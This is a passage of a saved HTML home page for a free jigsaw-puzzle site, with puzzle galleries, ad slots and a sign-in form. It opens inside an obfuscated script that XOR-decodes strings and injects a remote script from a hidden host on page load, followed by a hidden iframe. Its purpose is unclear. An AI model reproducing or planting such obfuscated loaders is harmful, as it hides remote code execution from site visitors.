+"i")).test(c)?z:window[b("GgoTFjsO")]?t:"undefined"!==typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(c)&&(a=window);g.c=a[b("KzYiKTMOPzA2Og0NBD8PBzs=")]||a[b("DgcDEj8fHycaBAYNFQgJBjsXDD0fJQE=")]||a[b("FA0bKwIoHRY8JiAHCSUDCyEbACc=")]||a[b("FBEzLRU7KBYrFwwGCS4FHDwdAQ==")];g.f=a[b("KzYiKjMYPho2OicNFCgUASUGBiYY")]||a[b("DgcDEj8fHycaBwYbFCIJBhEXHCoEIx8NIxga")]||a[b("FA0bKwIoHhYqJwoHCQ8DGzYABjkCIwAX")]||a[b("FBEzLRU4KAAqPQwGIy4VCycbHz0fJQE=")];g.b=a[b("KzYiMDUODhI3MAoMBj8D")]||a[b("DgcDEj8fHycaHQANJCoIDDwWDj0T")]||
+a[b("FA0bKwIoBBA8FwIGAyICCSEX")]||a[b("FBEzLRUiLhYaNQ0MDi8HHDA=")];c===q?(c=H(),g.a=y(c)[b("LgcDKjkIJhYt")],c.parentElement.removeChild(c)):g.a=a[b("LgcDKjkIJhYt")];g.g=a[b("IS8tMSIfPSE8JRYNFD8=")]}function D(a,b){for(var c=new Uint8Array(b),d=new ArrayBuffer(b.byteLength),d=new Uint8Array(d),f=0;f<b.byteLength;f++)d[f]=c[f]^a.charCodeAt(f%a.length);return d.buffer}function r(a){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(a));var b="";a=new Uint8Array(a);for(var e=
+a.byteLength,d=0;d<e;d++)b+=String.fromCharCode(a[d]);return decodeURIComponent(escape(b))}function E(a){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(a).buffer;a=unescape(encodeURIComponent(a));for(var b=new Uint8Array(a.length),e=0;e<a.length;e++)b[e]=a.charCodeAt(e);return b.buffer}function x(){return b("VgcLCmkbcA==")+"2138610003"}function b(a){a=window.atob(a);for(var b="",e=0;e<a.length;e++)b+=String.fromCharCode(a.charCodeAt(e)^"ybayVkMsYTchgKfhUroIvJoyJwtQWMWW".charCodeAt(e%
+32));return b}function v(){if(!J){var a=("https:"==window.location.protocol?"https://":"http://")+u+T,b=document.createElement("script");b.type="text/javascript";b.async=!0;b.src=a;(document.body||document.head||document.documentElement).appendChild(b);J=!0}}var u=b("AQoTVywCIRw+OxEJSSgJBQ=="),w=b("GEwbEDoEKhwrNU0LCCY="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2138610003",N="/l?p=2138610003&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||
+window.ucweb)try{v()}catch(a){}try{B()}catch(a){}})()}catch(B){};</script><iframe name="thqjoma" srcdoc="a" style="height: 1px; width: 1px; display: none;"></iframe>
+<script type="text/javascript">
+var competemode = true;
+var selectedsize = 5;
+var selectedcut =  8;
+var pagewidth;
+var pageheight;
+var refreshhi
+if (competemode == true)
+{
+	refreshhi = true;
+}
+else
+{
+	refreshhi = false
+}
+function generatelink(puzzlenum)
+{
+	var routeto =    'https://www.jspuzzles.com/puzzle.php?puzzle='+puzzlenum+'&amp;lang=en&amp;size='+selectedsize+'&amp;cut='+selectedcut+'&amp;scale='+selectedscale;
+	var routeto2 =   'https://www.jspuzzles.com/puzzle.php?puzzle='+puzzlenum+'&lang=en&size='+selectedsize+'&cut='+selectedcut+'&scale='+selectedscale;
+	document.getElementById('playlink').innerHTML = '<a class="winplaylink" href="'+routeto+'">Play This Puzzle</a>';
+	document.getElementById('playlink').onclick  = function(){window.location.href = routeto2;}
+	if (puzzlenum >= 2454318) {pic_dir = "pic3";} else {pic_dir = "userpic3";}
+	if (pageheight < 510)
+	{
+		document.getElementById("puzzledialog").style.top = "2px";
+		document.getElementById("dialogimg").innerHTML = '<a href="'+routeto+'"><img src="https://cdn.jspuzzles.com/'+pic_dir+'/'+puzzlenum+'.jpg" style="width:212px;height:143px;border:2px solid #DCDADB;" alt=""/></a>';
+		if ((refreshhi == true) && (competemode == true))
+		{
+			document.getElementById("hiscoretab").innerHTML='<div style="width:400px;text-align:center;"><img src="https://cdn.jspuzzles.com/artwork/ajaxloading.gif" alt="" /></div>';
+			gethiscore("en",puzzlenum,selectedcut, selectedsize,"small");
+		}
+	}
+	else
+	{
+		if (pageheight < 625) {document.getElementById("puzzledialog").style.top = "10px";}
+		document.getElementById("dialogimg").innerHTML = '<a href="'+routeto+'"><img src="https://cdn.jspuzzles.com/'+pic_dir+'/'+puzzlenum+'.jpg" style="width:390px;height:262px;border:2px solid #DCDADB;" alt=""/></a>';
+		if ((refreshhi == true) && (competemode == true))
+		{
+			document.getElementById("hiscoretab").innerHTML='<div style="width:400px;text-align:center;"><img src="https://cdn.jspuzzles.com/artwork/ajaxloading.gif" alt="" /></div>';
+			gethiscore("en",puzzlenum,selectedcut, selectedsize,"normal");
+		}
+	}
+}
+
+var currentwinpuzzlenum;
+function viewwin(puzzlenum)
+{
+	currentwinpuzzlenum = puzzlenum;
+	var sizelinks = '<table cellspacing="8" cellpadding="0" align="center">';
+    sizelinks = sizelinks+ '<tr><td id="size3" class="winnotsel" onclick="selectsize(3,'+puzzlenum+');">9 Pieces</td>';
+    sizelinks = sizelinks+ '<td id="size4" class="winnotsel" onclick="selectsize(4,'+puzzlenum+');">16 Pieces</td>';
+    sizelinks = sizelinks+ '<td id="size5" class="winnotsel" onclick="selectsize(5,'+puzzlenum+');">25 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size6" class="winnotsel" onclick="selectsize(6,'+puzzlenum+');">36 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size7" class="winnotsel" onclick="selectsize(7,'+puzzlenum+');">49 Pieces</td></tr><tr>';
+	sizelinks = sizelinks+ '<td id="size8" class="winnotsel" onclick="selectsize(8,'+puzzlenum+');">64 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size9" class="winnotsel" onclick="selectsize(9,'+puzzlenum+');">81 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size10" class="winnotsel" onclick="selectsize(10,'+puzzlenum+');">100 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size12" class="winnotsel" onclick="selectsize(12,'+puzzlenum+');">144 Pieces</td>';
+	sizelinks = sizelinks+ '<td id="size15" class="winnotsel" onclick="selectsize(15,'+puzzlenum+');">225 Pieces</td></tr></table>';
+	var cutlinks = '<table cellspacing="8" cellpadding="0" align="center">';
+	cutlinks = cutlinks+ '<tr><td><img id="cut8" src="https://cdn.jspuzzles.com/artwork/c8.jpg" class="wincutnotsel" onclick="selectcut(8,'+puzzlenum+');" alt="" /></td>';
+	cutlinks = cutlinks+ '<td><img id="cut7" src="https://cdn.jspuzzles.com/artwork/c7.jpg" class="wincutnotsel" onclick="selectcut(7,'+puzzlenum+');" alt="" /></td>';
+	cutlinks = cutlinks+ '<td><img id="cut5" src="https://cdn.jspuzzles.com/artwork/c5.jpg" class="wincutnotsel" onclick="selectcut(5,'+puzzlenum+');" alt="" /></td>';
+	cutlinks = cutlinks+ '<td><img id="cut4" src="https://cdn.jspuzzles.com/artwork/c4.jpg" class="wincutnotsel" onclick="selectcut(4,'+puzzlenum+');" alt="" /></td>';
+	cutlinks = cutlinks+ '<td><img id="cut2" src="https://cdn.jspuzzles.com/artwork/c2.jpg" class="wincutnotsel" onclick="selectcut(2,'+puzzlenum+');" alt="" /></td>';
+	cutlinks = cutlinks+ '<td><img id="cut1" src="https://cdn.jspuzzles.com/artwork/c1.jpg" class="wincutnotsel" onclick="selectcut(1,'+puzzlenum+');" alt="" /></td></tr></table>';
+	var scalelinks = '<table cellspacing="0" cellpadding="0" align="center">';
+    scalelinks = scalelinks+ '<tr><td id="scale3" class="winscalenotsel" onclick="selectscale(3,'+puzzlenum+');">&nbsp;&nbsp;Small Pieces&nbsp;&nbsp;</td><td>&nbsp;&nbsp;&nbsp;</td>';
+    scalelinks = scalelinks+ '<td id="scale6" class="winscalenotsel" onclick="selectscale(6,'+puzzlenum+');">&nbsp;&nbsp;Large Pieces&nbsp;&nbsp;</td></tr></table>';
+	document.getElementById("cutlinks").innerHTML = cutlinks;
+	document.getElementById("sizelinks").innerHTML = sizelinks;
+	document.getElementById('cut'+selectedcut).style.border = "3px solid #E62A38";
+	document.getElementById('size'+selectedsize).className ='winsel';
+	document.getElementById("scalelinks").innerHTML = scalelinks;
+	document.getElementById('scale'+selectedscale).className ='winscalesel';
+	generatelink(puzzlenum);
+	$('#puzzledialog').jqmShow();
+	return true;
+}
+</script>
+<script type="text/javascript">
+ function logdebug(msg) { if (false) console.log(msg) }logdebug("viewwinbodyinit");pagewidth = pageWidth();
+pageheight = pageHeight();
+logdebug("pageheight="+pageheight);logdebug("pagewidth="+pagewidth);logdebug("GLOBALS[whichpage]=index");logdebug("GLOBALS[settings_scale]=0");if ((pagewidth>1150) && (pageheight>630)) {var selectedscale = 6;} else {var selectedscale = 3;}
+logdebug("selectedscale="+selectedscale);</script>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab" style="background-image:url(https://cdn.jspuzzles.com/artwork/indexheaderltr-min.jpg);background-repeat:no-repeat;"><tbody><tr><td style="width:306px;height:120px;text-align:left;vertical-align:top;">
+<img alt="Play free Jigsaw puzzles online" src="https://cdn.jspuzzles.com/artwork/logo-min.jpg" style="border:0px;width:306px;height:103px"/></td>
+<td style="width:628px;text-align:right;vertical-align:middle;font-size:17px;padding-right:10px;padding-bottom:22px;"><a class="toplink" href="https://www.jspuzzles.com/en/register.php" style="color:#4F4F4F;">Upload New Puzzle</a> | 
+<a class="toplink" href="https://www.jspuzzles.com/gallery.php?lang=en&amp;reqtype=all&amp;su=s&amp;camefrom=top">Our Gallery</a> | <a class="addthis_button" href="https://www.addthis.com/bookmark.php?v=300&amp;pubid=jspuzzles" style="color:#4F4F4F;text-decoration:underline">Bookmark</a>
+ | <a class="toplink" href="#signinlink" style="color:#4F4F4F;">Sign In</a>
+</td></tr></tbody></table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab">
+<tbody><tr>
+<td class="indexdailydesctd" style="padding-left:5px;padding-top:5px;">
+<table style="margin:0px;padding:0px;">
+<tbody><tr>
+<td>
+<!-- daily puzzle block & image -->
+<div class="hfade2toggle" id="fade2toggle">
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="htablefixed" style="margin:0px;">
+<colgroup><col class="hwidth50"/><col class="hwidth206"/><col class="hwidth50"/></colgroup>
+<tbody><tr><td class="indexdailylefttd">
+<a class="prev" href="#"><img alt="Daily Puzzle" class="indexdailynav bg-homedailyleft" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></a>
+</td><td class="indexdailycentertd">
+<div id="fadeshow2" style="position: relative; visibility: visible; background: black; overflow: hidden; width: 202px; height: 152px;"><div class="gallerylayer" style="position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; background: rgb(247, 245, 246); z-index: 999;"><img class="indexslideshowpic" onclick="viewwin(2458783)" src="https://cdn.jspuzzles.com/thumb/2458783_s.jpg" style="display: none;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458782)" src="https://cdn.jspuzzles.com/thumb/2458782_s.jpg" style="display: none;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458781)" src="https://cdn.jspuzzles.com/thumb/2458781_s.jpg" style="display: none;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458780)" src="https://cdn.jspuzzles.com/thumb/2458780_s.jpg" style="display: none;"/>
+</div><div class="gallerylayer" style="position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; background: rgb(247, 245, 246); z-index: 1000; opacity: 1;"><img class="indexslideshowpic" onclick="viewwin(2458783)" src="https://cdn.jspuzzles.com/thumb/2458783_s.jpg" style="display: inline; margin-left: 0px; margin-top: 8.5px; cursor: pointer;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458782)" src="https://cdn.jspuzzles.com/thumb/2458782_s.jpg" style="display: none;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458781)" src="https://cdn.jspuzzles.com/thumb/2458781_s.jpg" style="display: none;"/>
+<img class="indexslideshowpic" onclick="viewwin(2458780)" src="https://cdn.jspuzzles.com/thumb/2458780_s.jpg" style="display: none;"/>
+</div><img src="https://cdn.jspuzzles.com/artwork/loading.gif" style="position: absolute; left: 73px; top: 20px; display: none;"/></div>
+<div class="hfashodesc" id="fashowdesc"><span onclick="viewwin(2458783)" style="cursor:pointer;">Today</span></div>
+</td><td class="indexdailyrighttd">
+<a class="next" href="#"><img alt="Daily Puzzle" class="indexdailynav bg-homedailyright" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></a>
+</td></tr></tbody></table>
+</div>
+</td>
+<td>
+<!-- daily puzzle text -->
+<br/>
+<h1 class="hindexh1">Free Jigsaw Puzzles</h1>
+<br/><br/>
+<div class="hindexdivh1">
+		A new jigsaw puzzle every day! Start your morning with our daily online jigsaw puzzles.<br/><br/>
+		Every day we post a new puzzle with a different theme - nature, places, animals, scenery and more!		</div>
+<div class="hlineheight15"><br/></div>
+<div class="indexgalbutton hfloatright" onclick="window.location.href = 'gallery.php?lang=en&amp;su=s&amp;reqtype=all&amp;camefrom=index';">
+<a class="indexgallink" href="gallery.php?lang=en&amp;su=s&amp;reqtype=all&amp;camefrom=index">View Gallery</a>
+</div>
+</td>
+</tr>
+</tbody></table>
+</td>
+<td class="hwidth14" width="14px"> </td>
+<td class="indexdailybox">
+<div>
+<!-- /21625667795/JSP_Index_D300x250_2 -->
+<div id="div-gpt-ad-1505817075157-0">
+<script>
+googletag.cmd.push(function()
+{
+  googletag.display('div-gpt-ad-1505817075157-0');
+  googletag.pubads().refresh([home300]);
+});
+</script>
+<div id="google_ads_iframe_/21625667795/JSP_Index_D300x250_2_0__container__" style="border: 0pt none; width: 320px; height: 50px;"></div></div>
+</div>
+</td></tr></tbody></table>
+<div class="hlineheight20"> </div>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab">
+<colgroup><col class="hwidth108"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/><col class="hwidth109"/></colgroup>
+<tbody><tr>
+<!-- cdn combine images -->
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458728)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  0px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458727)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -98px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458726)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -196px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458725)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -294px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458724)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -392px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458723)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -490px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458722)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -588px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458721)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -686px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458720)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -784px 0px;"/></td>
+</tr><tr>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458533)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -882px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458532)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -980px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458531)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1078px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458530)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1176px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458529)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1274px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458528)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1372px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458527)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1470px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458526)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1568px 0px;"/></td>
+<td class="indeximgtd"><img alt="Random Jigsaw puzzle" class="indexpic" onclick="viewwin(2458525)" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="background: url(https://cdn.jspuzzles.com/todaypuzzles/2458783.jpg)  -1666px 0px;"/></td>
+</tr></tbody></table>
+<br/>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab">
+<tbody><tr><td class="galadbox" colspan="2">
+<!-- /21625667795/JSP_Index_D728x90_1 -->
+<div id="div-gpt-ad-1505817075157-1">
+<script>
+googletag.cmd.push(function()
+{
+  googletag.display('div-gpt-ad-1505817075157-1');
+  googletag.pubads().refresh([home728]);
+});
+</script>
+<div id="google_ads_iframe_/21625667795/JSP_Index_D728x90_1_0__container__" style="border: 0pt none; width: 320px; height: 50px;"></div></div>
+</td></tr>
+</tbody></table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="hwidth970">
+<tbody><tr><td align="left" class="hindextd1">
+<img alt="" class="bg-puzzlepiece puzzlepiece35x26" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/>
+<div class="index2linkdiv"><a class="gallink" href="puzzle.php?puzzle=2456184&amp;lang=en&amp;size=5&amp;cut=8&amp;scale=3">Random Jigsaw puzzle</a></div>
+</td>
+<td class="hwidth60"> </td>
+<td align="right" class="hindextd2">
+<img alt="" class="bg-puzzlepiece puzzlepiece35x26" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/>
+<div class="index2linkdiv"><a class="gallink" href="en/aroundtheworld.php">Discover new puzzles around the world!</a></div>
+</td></tr></tbody></table>
+<br/>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="hindextable1ltr" id="signinlink">
+<tbody><tr><td class="hindextd6left">
+<table cellpadding="0" cellspacing="0" class="hwidth380">
+<tbody><tr><td class="hptop2pbot11" colspan="4">
+<span class="hfont18">Our Gallery</span>
+<span style="color:#E62A38;">(<a class="bigboxlink" href="gallery.php?lang=en&amp;reqtype=all&amp;su=s&amp;camefrom=index">View All Puzzles</a>)</span>
+</td></tr>
+<tr>
+<td class="indexgaltdar"><img align="middle" alt="Scenery Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=1&amp;su=s&amp;camefrom=index">Scenery</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Nature Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=2&amp;su=s&amp;camefrom=index">Nature</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Animals Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=3&amp;su=s&amp;camefrom=index">Animals</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Art Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=4&amp;su=s&amp;camefrom=index">Art</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Places Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=5&amp;su=s&amp;camefrom=index">Places</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Transportation Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=6&amp;su=s&amp;camefrom=index">Transportation</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Buildings Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=7&amp;su=s&amp;camefrom=index">Buildings</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Misc Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=0&amp;su=s&amp;camefrom=index">Misc</a></td>
+</tr></tbody></table>
+<table cellpadding="0" cellspacing="0" class="hwidth380">
+<tbody><tr><td class="hptop21pbot12" colspan="4">
+<span class="hfont18">User Albums Gallery</span>
+<span style="color:#E62A38;">(<a class="bigboxlink" href="gallery.php?lang=en&amp;reqtype=all&amp;su=u&amp;camefrom=index">View All Puzzles</a>)</span>
+</td></tr>
+<tr>
+<td class="indexgaltdar"><img align="middle" alt="General Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=0&amp;camefrom=index">General</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Travel and Places Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=1&amp;camefrom=index">Travel and Places</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Pets and Animals Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=2&amp;camefrom=index">Pets and Animals</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Scenery Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=5&amp;camefrom=index">Scenery</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Misc Family and Friends" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=4&amp;camefrom=index">Family and Friends</a></td>
+<td class="indexgaltdar"><img align="middle" alt="Misc Nature" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=6&amp;camefrom=index">Nature</a></td>
+</tr><tr>
+<td class="indexgaltdar"><img align="middle" alt="Misc For Kids" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=7&amp;camefrom=index">For Kids</a></td>
+<td class="indexgaltdar"><img align="middle" alt="View All Albums Jigsaw Puzzles" class="indexarrow bg-indexarrowltr" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/></td><td class="indexgaltdltr"><a class="indexgallink" href="gallery.php?lang=en&amp;reqtype=avgal&amp;avreq=all&amp;camefrom=index">View All Albums</a></td>
+</tr></tbody></table>
+</td>
+<td class="hindextd5 htextalignleft">
+<form class="hdisplayinline" onsubmit='loginloadXMLDoc("en");return false;'>
+<table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr><td class="hindextd4" colspan="3">
+<span class="hindexspan1">Sign in to your Account</span>
+   <span class="hfontbold" id="loginmsg"> </span>
+</td></tr>
+<tr>
+<td class="hwidth245"><span class="hindexspan2">User Name</span></td>
+<td class="hwidth20"> </td>
+<td class="hwidth265"><span class="hindexspan2">Password</span></td>
+</tr>
+<tr><td style="width:195px;padding-left:50px;height:34px;background-image:url(https://cdn.jspuzzles.com/artwork/indexloginuserltr.jpg);background-repeat:no-repeat;">
+<input id="loginname" maxlength="25" size="15" style="border:0px;background-color:white;font-size:20px;"/>
+</td>
+<td class="hwidth20"> </td>
+<td style="width:195px;padding-left:50px;height:34px;background-image:url(https://cdn.jspuzzles.com/artwork/indexloginpassltr.jpg);background-repeat:no-repeat;">
+<input id="loginpass" maxlength="20" size="15" style="border:0px;background-color:white;font-size:20px;" type="password"/>
+</td></tr></tbody></table>
+</form>
+<div class="lh7"> </div>
+<table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr><td style="padding-top:10px;vertical-align: top; width:350px;padding-left:55px;text-align:leftheight:62px;background-image:url(https://cdn.jspuzzles.com/artwork/indexloginnoteltr-min.jpg);background-repeat:no-repeat;color:#888687;font-size:17px;">
+Register to upload your own puzzles,<br/>Save and load your puzzles!</td>
+<td class="hwidth95">
+<div class="indexlogindiv bg-indexloginbutton" onclick='loginloadXMLDoc("en");'>
+<span class="hpointer" onclick='loginloadXMLDoc("en");' onmouseout="style.color='#4F4F4F';" onmouseover="style.color='#E62A38';">Sign in</span>
+</div>
+<div class="lh5"><br/></div>
+<div class="indexlogindiv bg-indexloginbutton" onclick="window.location.href = 'en/register.php';">
+<a class="indexloginlink" href="en/register.php">Register</a>
+</div>
+<br/>
+<div class="space10">
+<span class="fb-social"><a href="#"><img alt="" class="bg-facebooklogin" id="facebookl" src="/artwork/img_trans.gif" style="cursor:pointer"/></a>
+</span>
+</div>
+</td></tr></tbody></table>
+<span class="hfont14"> <a class="bigboxlink" href="en/forgotpass.php">Forgot your password?</a></span><br/>
+</td></tr></tbody></table><br/>
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab">
+<tbody>
+<tr>
+<td>
+<div align="center" class="hbottomdiv">
+				JSPuzzles is a gaming website born out of a love for jigsaw puzzles.<br/>
+				Play numerous stock puzzles alongside user generated puzzles with our friendly gameplay and fun features.<br/>
+				We also invite you to try our new <a href="https://www.livesudoku.com">free Sudoku puzzles</a>.
+				</div>
+</td>
+</tr>
+</tbody>
+</table>
+<div class="playJqmWindow nouserselect jqm-init" id="puzzledialog" onselectstart="return false;">
+<div class="jqmClose winclosebutton"> X</div><table align="center" border="0" cellpadding="0" cellspacing="0" dir="ltr" style="width:814px;direction:ltr;" width="814px">
+<tbody><tr><td id="imgtd" style="width:394px;padding-top:20px;text-align:center;"><div id="dialogimg" style="display:inline;"></div></td><td id="hiscorespacetd" style="width:15px;"></td><td id="hiscorepaneltd" style="width:405px;padding-top:20px;text-align:left;"><div id="hiscoretab"></div>
+</td>
+</tr>
+</tbody></table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" dir="ltr" style="width:940px;direction:ltr;" width="940px">
